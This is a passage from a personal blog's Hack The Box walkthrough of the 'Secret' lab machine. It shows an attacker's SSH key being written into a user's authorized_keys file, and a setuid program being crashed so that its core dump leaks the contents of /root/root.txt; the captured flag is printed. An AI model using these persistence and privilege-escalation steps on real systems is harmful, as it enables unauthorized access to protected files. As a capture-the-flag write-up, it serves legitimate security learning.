ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDNqDVdacTuvz2AVIqgyOVxu2hxQPf9Uy3wqicy08b6txTgEDTl634/V9FY6V1Sc4gv+tuPyTEu09pT1nuNcoHJPC0Qhf2Vw5Q7+JxfZnJb1FhsRAhN3IKCA3Qp+uzcnCLBqjvSUfH/11PNzntJwK7jkHKOdGmp1hx1HV8uuvrKcxTvFwpRO9LSyG+38cQslawnwSaR99hIw9Aql76qJl96pW+IK10YORNmU2IPL1uIAUuDiSX2r4udpywLiGGaMFsnn9xxwnt6wmMu04X0m31oJ6mD8+NKGP3wuxh36wscyma/jE8EDsCpBaKCuVhyq3gASOKaDDFLN1ZRZdRV1bgFEwq/PFB1vgovZ1jG+TXuBvN86taTvFRFw2CHGI51bcvZwJHS+SfHTZzd8ucqCeTmTmB4mF3047hbkN/QW1R6kPpYH2rVpDiGIfEkndiHLT4cWSivnufp8OXUP4LvP8rUjKHBTiF6Kwi++PBg8ZKSoYIxTZ2UUdid0qzDMHANvh0<span style="color:#f92672">=</span> werz@werznet
</code></pre></div><p>copy it, to the target machine <strong>/home/dasith/.ssh/authorized_keys</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">dasith@secret:~/.ssh$ echo ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDNqDVdacTuvz2AVIqgyOVxu2hxQPf9Uy3wqicy08b6txTgEDTl634/V9FY6V1Sc4gv+tuPyTEu09pT1nuNcoHJPC0Qhf2Vw5Q7+JxfZnJb1FhsRAhN3IKCA3Qp+uzcnCLBqjvSUfH/11PNzntJwK7jkHKOdGmp1hx1HV8uuvrKcxTvFwpRO9LSyG+38cQslawnwSaR99hIw9Aql76qJl96pW+IK10YORNmU2IPL1uIAUuDiSX2r4udpywLiGGaMFsnn9xxwnt6wmMu04X0m31oJ6mD8+NKGP3wuxh36wscyma/jE8EDsCpBaKCuVhyq3gASOKaDDFLN1ZRZdRV1bgFEwq/PFB1vgovZ1jG+TXuBvN86taTvFRFw2CHGI51bcvZwJHS+SfHTZzd8ucqCeTmTmB4mF3047hbkN/QW1R6kPpYH2rVpDiGIfEkndiHLT4cWSivnufp8OXUP4LvP8rUjKHBTiF6Kwi++PBg8ZKSoYIxTZ2UUdid0qzDMHANvh0<span style="color:#f92672">=</span> werz@werznet &gt; authorized_keys
</code></pre></div><p>just ssh there now</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ssh dasith@10.10.11.120
</code></pre></div><p>so what i need to do is pretty easy</p>
<pre tabindex="0"><code>./count
Enter source file/directory name:/root/root.txt
</code></pre><p>i aimed for the flag</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">Enter source file/directory name: /root/root.txt

Total characters <span style="color:#f92672">=</span> <span style="color:#ae81ff">33</span>
Total words      <span style="color:#f92672">=</span> <span style="color:#ae81ff">2</span>
Total lines      <span style="color:#f92672">=</span> <span style="color:#ae81ff">2</span>
Save results a file? <span style="color:#f92672">[</span>y/N<span style="color:#f92672">]</span>: y
Path: 
</code></pre></div><p>then go to the other shell and check process and crash the count program</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">dasith@secret:/opt$ ps -aux | grep count
root         <span style="color:#ae81ff">825</span>  0.0  0.1 <span style="color:#ae81ff">235668</span>  <span style="color:#ae81ff">7444</span> ?        Ssl  Mar10   0:01 /usr/lib/accountsservice/accounts-daemon
root       <span style="color:#ae81ff">84603</span>  0.0  0.0   <span style="color:#ae81ff">2488</span>   <span style="color:#ae81ff">516</span> pts/2    S+   Mar10   0:00 ./count
root       <span style="color:#ae81ff">84633</span>  0.0  0.0   <span style="color:#ae81ff">2488</span>   <span style="color:#ae81ff">588</span> ?        S    Mar10   0:00 ./count
dasith     <span style="color:#ae81ff">84979</span>  0.0  0.0   <span style="color:#ae81ff">2488</span>   <span style="color:#ae81ff">588</span> pts/7    S+   00:19   0:00 ./count
dasith     <span style="color:#ae81ff">84997</span>  0.0  0.0   <span style="color:#ae81ff">2488</span>   <span style="color:#ae81ff">584</span> pts/4    S+   00:22   0:00 ./count
dasith     <span style="color:#ae81ff">85440</span>  0.0  0.0   <span style="color:#ae81ff">2488</span>   <span style="color:#ae81ff">588</span> pts/10   S+   01:16   0:00 ./count -p
dasith     <span style="color:#ae81ff">85446</span>  0.0  0.0   <span style="color:#ae81ff">6432</span>   <span style="color:#ae81ff">672</span> pts/11   S+   01:17   0:00 grep --color<span style="color:#f92672">=</span>auto count
dasith@secret:/opt$ kill -BUS <span style="color:#ae81ff">85440</span>
</code></pre></div><p>then just kill the process, and check if its down on the other shell</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">dasith@secret:/opt$ ./count -p
Enter source file/directory name: /root/root.txt
Total characters <span style="color:#f92672">=</span> <span style="color:#ae81ff">33</span>
Total words      <span style="color:#f92672">=</span> <span style="color:#ae81ff">2</span>
Total lines      <span style="color:#f92672">=</span> <span style="color:#ae81ff">2</span>
Save results a file? <span style="color:#f92672">[</span>y/N<span style="color:#f92672">]</span>: y
Path: Bus error <span style="color:#f92672">(</span>core dumped<span style="color:#f92672">)</span>
</code></pre></div><p>core dumped!</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">dasith@secret:/var/crash$ ls
d  _opt_count.0.crash  _opt_count.1000.crash  _opt_countzz.0.crash
</code></pre></div><p>Here you can see that the error log has been generated, create a new directory of our own, and then copy the file over there</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">dasith@secret:/var/crash$ mkdir /tmp/me
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">dasith@secret:/var/crash$ apport-unpack _opt_count.1000.crash /tmp/me
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">dasith@secret:/tmp/lucifiel$ ls -la
ls -la
total <span style="color:#ae81ff">436</span>
drwxr-xr-x  <span style="color:#ae81ff">2</span> dasith dasith   <span style="color:#ae81ff">4096</span> Dec  <span style="color:#ae81ff">6</span> 07:51 .
drwxrwxrwt <span style="color:#ae81ff">13</span> root   root     <span style="color:#ae81ff">4096</span> Dec  <span style="color:#ae81ff">6</span> 07:49 ..
-rw-r--r--  <span style="color:#ae81ff">1</span> dasith dasith      <span style="color:#ae81ff">5</span> Dec  <span style="color:#ae81ff">6</span> 07:51 Architecture
-rw-r--r--  <span style="color:#ae81ff">1</span> dasith dasith <span style="color:#ae81ff">380928</span> Dec  <span style="color:#ae81ff">6</span> 07:51 CoreDump
-rw-r--r--  <span style="color:#ae81ff">1</span> dasith dasith     <span style="color:#ae81ff">24</span> Dec  <span style="color:#ae81ff">6</span> 07:51 Date
-rw-r--r--  <span style="color:#ae81ff">1</span> dasith dasith     <span style="color:#ae81ff">12</span> Dec  <span style="color:#ae81ff">6</span> 07:51 DistroRelease
-rw-r--r--  <span style="color:#ae81ff">1</span> dasith dasith     <span style="color:#ae81ff">10</span> Dec  <span style="color:#ae81ff">6</span> 07:51 ExecutablePath
-rw-r--r--  <span style="color:#ae81ff">1</span> dasith dasith     <span style="color:#ae81ff">10</span> Dec  <span style="color:#ae81ff">6</span> 07:51 ExecutableTimestamp
-rw-r--r--  <span style="color:#ae81ff">1</span> dasith dasith      <span style="color:#ae81ff">5</span> Dec  <span style="color:#ae81ff">6</span> 07:51 ProblemType
-rw-r--r--  <span style="color:#ae81ff">1</span> dasith dasith     <span style="color:#ae81ff">10</span> Dec  <span style="color:#ae81ff">6</span> 07:51 ProcCmdline
-rw-r--r--  <span style="color:#ae81ff">1</span> dasith dasith      <span style="color:#ae81ff">4</span> Dec  <span style="color:#ae81ff">6</span> 07:51 ProcCwd
-rw-r--r--  <span style="color:#ae81ff">1</span> dasith dasith     <span style="color:#ae81ff">53</span> Dec  <span style="color:#ae81ff">6</span> 07:51 ProcEnviron
-rw-r--r--  <span style="color:#ae81ff">1</span> dasith dasith   <span style="color:#ae81ff">2144</span> Dec  <span style="color:#ae81ff">6</span> 07:51 ProcMaps
-rw-r--r--  <span style="color:#ae81ff">1</span> dasith dasith   <span style="color:#ae81ff">1336</span> Dec  <span style="color:#ae81ff">6</span> 07:51 ProcStatus
-rw-r--r--  <span style="color:#ae81ff">1</span> dasith dasith      <span style="color:#ae81ff">1</span> Dec  <span style="color:#ae81ff">6</span> 07:51 Signal
-rw-r--r--  <span style="color:#ae81ff">1</span> dasith dasith     <span style="color:#ae81ff">29</span> Dec  <span style="color:#ae81ff">6</span> 07:51 Uname
-rw-r--r--  <span style="color:#ae81ff">1</span> dasith dasith      <span style="color:#ae81ff">3</span> Dec  <span style="color:#ae81ff">6</span> 07:51 UserGroups
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">dasith@secret:/tmp/me$ strings CoreDump 
CORE
CORE
count
./count -p 
IGISCORE
CORE
ELIFCORE
/opt/count
/opt/count
/opt/count
/opt/count
/opt/count
/usr/lib/x86_64-linux-gnu/libc-2.31.so
/usr/lib/x86_64-linux-gnu/libc-2.31.so
/usr/lib/x86_64-linux-gnu/libc-2.31.so
/usr/lib/x86_64-linux-gnu/libc-2.31.so
/usr/lib/x86_64-linux-gnu/libc-2.31.so
/usr/lib/x86_64-linux-gnu/libc-2.31.so
/usr/lib/x86_64-linux-gnu/ld-2.31.so
/usr/lib/x86_64-linux-gnu/ld-2.31.so
/usr/lib/x86_64-linux-gnu/ld-2.31.so
/usr/lib/x86_64-linux-gnu/ld-2.31.so
/usr/lib/x86_64-linux-gnu/ld-2.31.so
CORE
////////////////
Path: 
Could
LINUX
////////////////
Path: 
Could
/lib64/ld-linux-x86-64.so.2
libc.so.6
setuid
exit
readdir
fopen
closedir
__isoc99_scanf
strncpy
__stack_chk_fail
putchar
fgetc
strlen
prctl
getchar
fputs
fclose
opendir
getuid
strncat
__cxa_finalize
__libc_start_main
snprintf
__xstat
__lxstat
GLIBC_2.7
GLIBC_2.4
GLIBC_2.2.5
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
Unable to open directory.
??????????
Total entries       <span style="color:#f92672">=</span> %d
Regular files       <span style="color:#f92672">=</span> %d
Directories         <span style="color:#f92672">=</span> %d
Symbolic links      <span style="color:#f92672">=</span> %d
Unable to open file.
Please check <span style="color:#66d9ef">if</span> file exists and you have read privilege.
Total characters <span style="color:#f92672">=</span> %d
Total words      <span style="color:#f92672">=</span> %d
Total lines      <span style="color:#f92672">=</span> %d
Enter source file/directory name: 
%99s
Save results a file? <span style="color:#f92672">[</span>y/N<span style="color:#f92672">]</span>: 
Path: 
Could not open %s <span style="color:#66d9ef">for</span> writing
:*3$<span style="color:#e6db74">&#34;
</span><span style="color:#e6db74">Path: esults a file? [y/N]: words      = 2
</span><span style="color:#e6db74">Total lines      = 2
</span><span style="color:#e6db74">oot/root.txt
</span><span style="color:#e6db74">6eddd0a82cdbded0add46c264f939a16   ## THE FLAG !!!
</span><span style="color:#e6db74">aliases
</span><span style="color:#e6db74">ethers
</span><span style="color:#e6db74">group
</span><span style="color:#e6db74">gshadow
</span><span style="color:#e6db74">hosts
</span><span style="color:#e6db74">initgroups
</span><span style="color:#e6db74">netgroup
</span><span style="color:#e6db74">networks
</span><span style="color:#e6db74">passwd
</span><span style="color:#e6db74">protocols
</span><span style="color:#e6db74">publickey
</span><span style="color:#e6db74">services
</span><span style="color:#e6db74">shadow
</span><span style="color:#e6db74">CAk[S
</span><span style="color:#e6db74">libc.so.6
</span><span style="color:#e6db74">/lib/x86_64-linux-gnu
</span><span style="color:#e6db74">libc.so.6
</span><span style="color:#e6db74">uTi7J
</span><span style="color:#e6db74">|F:m
</span><span style="color:#e6db74">_rtld_global
</span><span style="color:#e6db74">__get_cpu_features
</span><span style="color:#e6db74">_dl_find_dso_for_object
</span><span style="color:#e6db74">_dl_make_stack_executable
</span><span style="color:#e6db74">_dl_exception_create
</span><span style="color:#e6db74">__libc_stack_end
</span><span style="color:#e6db74">_dl_catch_exception
</span><span style="color:#e6db74">malloc
</span><span style="color:#e6db74">_dl_deallocate_tls
</span><span style="color:#e6db74">_dl_signal_exception
</span><span style="color:#e6db74">__tunable_get_val
</span><span style="color:#e6db74">__libc_enable_secure
</span><span style="color:#e6db74">__tls_get_addr
</span><span style="color:#e6db74">_dl_get_tls_static_info
</span><span style="color:#e6db74">calloc
</span><span style="color:#e6db74">_dl_exception_free
</span><span style="color:#e6db74">_dl_debug_state
</span><span style="color:#e6db74">_dl_argv
</span><span style="color:#e6db74">_dl_allocate_tls_init
</span><span style="color:#e6db74">_rtld_global_ro
</span><span style="color:#e6db74">realloc
</span><span style="color:#e6db74">_dl_rtld_di_serinfo
</span><span style="color:#e6db74">_dl_mcount
</span><span style="color:#e6db74">_dl_allocate_tls
</span><span style="color:#e6db74">_dl_signal_error
</span><span style="color:#e6db74">_dl_exception_create_format
</span><span style="color:#e6db74">_r_debug
</span><span style="color:#e6db74">_dl_catch_error
</span><span style="color:#e6db74">ld-linux-x86-64.so.2
</span><span style="color:#e6db74">GLIBC_2.2.5
</span><span style="color:#e6db74">GLIBC_2.3
</span><span style="color:#e6db74">GLIBC_2.4
</span><span style="color:#e6db74">GLIBC_PRIVATE
</span><span style="color:#e6db74">sse2
</span><span style="color:#e6db74">x86_64
</span><span style="color:#e6db74">avx512_1
</span><span style="color:#e6db74">i586
</span><span style="color:#e6db74">i686
</span><span style="color:#e6db74">haswell
</span><span style="color:#e6db74">xeon_phi
</span><span style="color:#e6db74">linux-vdso.so.1
</span><span style="color:#e6db74">tls/x86_64/x86_64/tls/x86_64/
</span><span style="color:#e6db74">/lib/x86_64-linux-gnu/libc.so.6
</span><span style="color:#e6db74">%%%%%%%%%%%%%%%%
</span><span style="color:#e6db74">////////////////
</span><span style="color:#e6db74">ory name: 
</span><span style="color:#e6db74">%99s
</span><span style="color:#e6db74">/root/root.txt
</span><span style="color:#e6db74">Total characters = 33
</span><span style="color:#e6db74">Total words      = 2
</span><span style="color:#e6db74">Total lines      = 2
</span><span style="color:#e6db74">x86_64
</span><span style="color:#e6db74">./count
</span><span style="color:#e6db74">SHELL=/bin/bash
</span><span style="color:#e6db74">PWD=/opt
</span><span style="color:#e6db74">LOGNAME=dasith
</span><span style="color:#e6db74">XDG_SESSION_TYPE=tty
</span><span style="color:#e6db74">MOTD_SHOWN=pam
</span><span style="color:#e6db74">HOME=/home/dasith
</span><span style="color:#e6db74">LANG=en_US.UTF-8
</span><span style="color:#e6db74">LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:
</span><span style="color:#e6db74">SSH_CONNECTION=10.10.15.158 51728 10.10.11.120 22
</span><span style="color:#e6db74">LESSCLOSE=/usr/bin/lesspipe %s %s
</span><span style="color:#e6db74">XDG_SESSION_CLASS=user
</span><span style="color:#e6db74">TERM=xterm-256color
</span><span style="color:#e6db74">LESSOPEN=| /usr/bin/lesspipe %s
</span><span style="color:#e6db74">USER=dasith
</span><span style="color:#e6db74">SHLVL=1
</span><span style="color:#e6db74">XDG_SESSION_ID=20
</span><span style="color:#e6db74">XDG_RUNTIME_DIR=/run/user/1000
</span><span style="color:#e6db74">SSH_CLIENT=10.10.15.158 51728 22
</span><span style="color:#e6db74">XDG_DATA_DIRS=/usr/local/share:/usr/share:/var/lib/snapd/desktop
</span><span style="color:#e6db74">PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
</span><span style="color:#e6db74">DBUS_SESSION_BUS_ADDRESS=unix:path=/run/user/1000/bus
</span><span style="color:#e6db74">SSH_TTY=/dev/pts/10
</span><span style="color:#e6db74">_=./count
</span><span style="color:#e6db74">OLDPWD=/var/crash
</span><span style="color:#e6db74">./count
</span><span style="color:#e6db74">bemX
</span><span style="color:#e6db74">__vdso_gettimeofday
</span><span style="color:#e6db74">__vdso_time
</span><span style="color:#e6db74">__vdso_clock_gettime
</span><span style="color:#e6db74">__vdso_clock_getres
</span><span style="color:#e6db74">__vdso_getcpu
</span><span style="color:#e6db74">linux-vdso.so.1
</span><span style="color:#e6db74">LINUX_2.6
</span><span style="color:#e6db74">Linux
</span><span style="color:#e6db74">Linux
</span><span style="color:#e6db74">AUATS
</span><span style="color:#e6db74">A\A]]
</span><span style="color:#e6db74">[A\M
</span><span style="color:#e6db74">A]]I
</span><span style="color:#e6db74">[A\]
</span><span style="color:#e6db74">[A\]
</span><span style="color:#e6db74">GCC: (Ubuntu 9.3.0-17ubuntu1~20.04) 9.3.0
</span><span style="color:#e6db74">.shstrtab
</span><span style="color:#e6db74">.gnu.hash
</span><span style="color:#e6db74">.dynsym
</span><span style="color:#e6db74">.dynstr
</span><span style="color:#e6db74">.gnu.version
</span><span style="color:#e6db74">.gnu.version_d
</span><span style="color:#e6db74">.dynamic
</span><span style="color:#e6db74">.note
</span><span style="color:#e6db74">.eh_frame_hdr
</span><span style="color:#e6db74">.eh_frame
</span><span style="color:#e6db74">.text
</span><span style="color:#e6db74">.altinstructions
</span><span style="color:#e6db74">.altinstr_replacement
</span><span style="color:#e6db74">.comment
</span></code></pre></div><p>and we&rsquo;ve got the flag!</p>

    </div>
    
      
        <div class="pagination">
          <div class="pagination__title">
            <span class="pagination__title-h"
              >Read other posts</span
            >
            <hr />
          </div>
          <div class="pagination__buttons">
            
              <span class="button previous">
                <a href="https://0xwerz.github.io/08/01/2022/pandora/">
                  <span class="button__icon">←</span>
                  <span class="button__text">Pandora -- HTB walkthrough</span>
                </a>
              </span>
            
            
              <span class="button next">
                <a href="https://0xwerz.github.io/11/04/2020/tips-and-tricks/">
                  <span class="button__text">Tips-and-Tricks -- 247CTF walkthrough </span>
                  <span class="button__icon">→</span>
                </a>
              </span>
            
          </div>
        </div>
      
    

    
      
        

      
    
  </div>

      </div>

      
        <footer class="footer">
  <div class="footer__inner">
    
      <div class="copyright copyright--user">© 2022 Powered by Hugo</div>
      
  </div>
</footer>

<script src="https://0xwerz.github.io/assets/main.js"></script>
<script src="https://0xwerz.github.io/assets/prism.js"></script>


      
    </div>

    
      
<script async src="https://www.googletagmanager.com/gtag/js?id=G-R2DLLBQDPX"></script>
<script>
var doNotTrack = false;
if (!doNotTrack) {
	window.dataLayer = window.dataLayer || [];
	function gtag(){dataLayer.push(arguments);}
	gtag('js', new Date());
	gtag('config', 'G-R2DLLBQDPX', { 'anonymize_ip': false });
}
</script>

    
  </body>
</html>
